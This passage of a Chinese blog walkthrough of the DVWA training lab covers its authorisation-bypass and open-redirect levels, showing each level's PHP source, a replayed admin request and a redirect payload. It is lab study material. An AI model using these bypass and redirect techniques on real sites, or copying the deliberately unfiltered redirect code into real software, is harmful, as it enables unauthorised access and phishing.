    <span class="token function">http_response_code</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里他会判断该用户是否为admin，如果不是则返回403。</p>
<p>但值得注意的是，这段代码似乎只是检查medium.php页面。</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113190732432.png" alt="image-20240113190732432"></p>
<p>我们继续bp抓一下看看该页面的功能点，可以看到当我们点击update按钮的时候，我们实际上是被get_user_data.php页面进行处理，接下来我们可以猜测该页面没有做未授权处理，我们可以尝试直接访问该页面看看</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113190819631.png" alt="image-20240113190819631"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113190942972.png" alt="image-20240113190942972"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113190925561.png" alt="image-20240113190925561"></p>
<p>可以看到虽然其只对medium.php做了限制，当我们访问getuserdata的时候，仍然可以得到一些数据</p>
<h2 id="High-15">High</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">/*
Only the admin user is allowed to access this page.

Have a look at this file for possible vulnerabilities: 

* vulnerabilities/authbypass/change_user_details.php

*/</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">dvwaCurrentUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">print</span> <span class="token string double-quoted-string">"Unauthorised"</span><span class="token punctuation">;</span>
    <span class="token function">http_response_code</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>依旧是相同的代码，我们接着上一个级别的思路访问一下</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113192045447.png" alt="image-20240113192045447"></p>
<p>发现行不通了，这个api接口也被禁用了，接下来我们在管理员界面的更新数据地方，进行bp抓包，如下图发现，这里的api接口改为了change功能，而我们可以注意到上一个级别是get功能，这不禁让我们猜测，该功能可能并没有做出有效的未授权访问限制</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113193309714.png" alt="image-20240113193309714"></p>
<p>跟踪相关代码也可以发现，这里只对impossible级别做出的严格限制</p>
<p>接下来我们用其他用户访问该api页面，同时bp抓包admin用户的change功能对应的数据包</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113193638811.png" alt="image-20240113193638811"></p>
<p>接下来尝试将上面的json数据赋值到下面的普通用户数据包中，点击发送可以看到右侧回显访问成功的标志</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113193607250.png" alt="image-20240113193607250"></p>
<h2 id="Impossible-15">Impossible</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">/*

Only the admin user is allowed to access this page

*/</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">dvwaCurrentUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">print</span> <span class="token string double-quoted-string">"Unauthorised"</span><span class="token punctuation">;</span>
    <span class="token function">http_response_code</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里的代码依旧没有什么变化，但我们跟踪相关文件可以发现：</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113192943263.png" alt="image-20240113192943263"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113192956066.png" alt="image-20240113192956066"></p>
<p>这两个api功能文件在对impossible级别上都做出了严格的限制，只要当前用户不是admin，则无权访问，这是无法绕过的</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113193922658.png" alt="image-20240113193922658"></p>
<p>这里经过测试发现，直接显示无权访问</p>
<h1>0x16 HTTP 重定向</h1>
<h2 id="Low-16">Low</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">array_key_exists</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"redirect"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'redirect'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">header</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"location: "</span> <span class="token operator">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'redirect'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">http_response_code</span> <span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Missing redirect target.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里判断redirect参数是否通过get传参，是否存在，如果存在，则直接重定向到url，随后结束脚本执行，否则页面返回500响应。</p>
<p>这里并没有任何过滤，我们可以重定向到任何页面</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113172651501.png" alt="image-20240113172651501"></p>
<h2 id="Medium-16">Medium</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">array_key_exists</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"redirect"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'redirect'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"/http:\/\/|https:\/\//i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'redirect'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">http_response_code</span> <span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token delimiter important">?></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Absolute URLs not allowed.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
        <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
        <span class="token keyword">exit</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">header</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"location: "</span> <span class="token operator">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'redirect'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">exit</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">http_response_code</span> <span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Missing redirect target.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里限制了redirect参数以<a target="_blank" rel="noopener" href="http://xn--https-wm6jl44o">http://或者https</a>://开头，也就是不能以绝对的url开头，但是我们可以使用相对的url</p>
<p>这里借用阮一峰老师对相对url与绝对url的解释：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">URL 分成两种：绝对 URL 和相对 URL。

    绝对 URL 指的是，只靠 URL 本身就能确定资源的位置。这意味着，URL 必须带有资源的完整信息，包含协议、主机、路径等部分。前面的例子都是绝对 URL。

    相对 URL 指的是，URL 不包含资源位置的全部信息，必须结合当前网页的位置，才能定位资源。比如，当前网页的 URL 是<span class="token property">https</span><span class="token punctuation">:</span><span class="token comment">//www.example.com/path/index.html，该网页上面有一个资源，URL 指向a.html，这个就是相对 URL。因为只知道a.html，并不能定位资源。浏览器假定，a.html与当前网址在同一个子目录下面，从而得到绝对 URL https://www.example.com/path/a.html。</span>

相对 URL 如果以斜杠（/）开头，就表示网站的根目录。否则，必须以当前目录为起点，推算资源的位置。比如，相对 URL /foo/bar.html表示网站根目录的子目录foo，foo/bar.html表示在当前目录的foo子目录。

URL 还可以使用两个特殊简写，表示特定位置。

.：表示当前目录，比如./a.html（当前目录下的a.html文件）
..：表示上级目录，比如../a.html（上级目录下的a.html文件）
这两种简写可以多个连用，比如../../表示上两级目录。

绝对 URL 也可以使用这两个简写，比如www.example.com/./index.html等同于www.example.com/index.html，这时.相当于根目录的当前目录，即根目录本身。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>因此这一关我们可以这样构造</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113174804930.png" alt="image-20240113174804930"></p>
<h2 id="High-16">High</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">array_key_exists</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"redirect"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'redirect'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'redirect'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"info.php"</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">header</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"location: "</span> <span class="token operator">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'redirect'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">exit</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">http_response_code</span> <span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token delimiter important">?></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>You can only redirect to the info page.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
        <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
        <span class="token keyword">exit</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">http_response_code</span> <span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Missing redirect target.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里检查redirect中是否含有info.php字符串，如果含有才会正常的去请求重定向，否则返回500。</p>
<p>由代码审计得，在构造参数时是指包含字符串info.php即可</p>
<pre class="line-numbers language-none"><code class="language-none">Payload：?redirect&#x3D;https&#x2F;&#x2F;www.baidu.com&#x2F;?已定义参数&#x3D;info.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>注意：需要参考网页支持的参数来传递info.php。例如 当该网页没有设定a参数的get传参时：</p>
<p><code>GET ?redirect=https//www.baidu.com/?a=info.php</code> 是无效的，因为字符串&quot;info.php&quot;并未传递给合法的参数</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113175207282.png" alt="image-20240113175207282"></p>
<h2 id="Impossible-16">Impossible</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$target</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">array_key_exists</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"redirect"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'redirect'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token function">intval</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'redirect'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"info.php?id=1"</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>
            <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"info.php?id=2"</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">99</span><span class="token punctuation">:</span>
            <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"https://digi.ninja"</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$target</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">header</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"location: "</span> <span class="token operator">.</span> <span class="token variable">$target</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">exit</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token delimiter important">?></span></span>
        Unknown redirect target.
        <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
        <span class="token keyword">exit</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span>
Missing redirect target.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里采用了表名单过滤，并且将redirect参数内容转换为了整数，这意味着redirect对我们来说已经不可控了</p>
<h1>0x18 参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_77485708/article/details/131222466">[网络安全] DVWA之Open HTTP Redirect 攻击姿势及解题详析合集</a></p>
<p><a target="_blank" rel="noopener" href="https://www.bookstack.cn/read/html-tutorial/spilt.4.docs-url.md">绝对 URL 和相对 URL</a></p>
<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/05/dvwa.html#%E9%83%A8%E7%BD%B2%E5%AE%89%E8%A3%85">DVWA 入门靶场学习记录</a></p>
</script></p>
                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">hybcx</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://hybcx.xyz/2024/01/10/shen-ru-dvwa/">http://hybcx.xyz/2024/01/10/shen-ru-dvwa/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">hybcx</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/web%E6%B8%97%E9%80%8F/">
                                    <span class="chip bg-color">web渗透</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">随缘，看各位佬的心情</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    
        <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments textarea {
        box-sizing: border-box;
        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #4cbf30;
        font-weight: 500;
        text-decoration: none;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="vcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="/libs/valine/av-min.js"></script>
<script src="/libs/valine/Valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        appId: 'u0n6SeKEfoilg30pN4VxouXR-MdYXbMMI',
        appKey: '36SdcVNDUm7oJBLF0OpXO4ut',
        serverURLs: 'https://u0n6seke.api.lncldglobal.com',
        notify: 'false' === 'true',
        verify: 'false' === 'true',
        visitor: 'false' === 'true',
        avatar: 'mm',
        pageSize: '10',
        lang: 'zh-cn',
        placeholder: 'just go go'
    });
</script>

<!--酷Q推送-->


    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2024/01/24/ctf-shua-ti-zhi-lu/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="CISCN国赛">
                        
                        <span class="card-title">CISCN国赛</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2024-01-24
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CTF%E8%B5%9B%E4%BA%8B/" class="post-category">
                                    CTF赛事
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/CTF%E8%B5%9B%E4%BA%8B/">
                        <span class="chip bg-color">CTF赛事</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2023/12/31/shen-tou-ce-shi-wai-wang-da-dian/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="渗透测试流程&amp;外网打点">
                        
                        <span class="card-title">渗透测试流程&amp;外网打点</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2023-12-31
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category">
                                    内网渗透
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
                        <span class="chip bg-color">内网渗透</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>


  <!-- 是否加载使用自带的 prismjs. -->
  <script type="text/javascript" src="/libs/prism/prism.js"></script>


<!-- 代码语言 -->


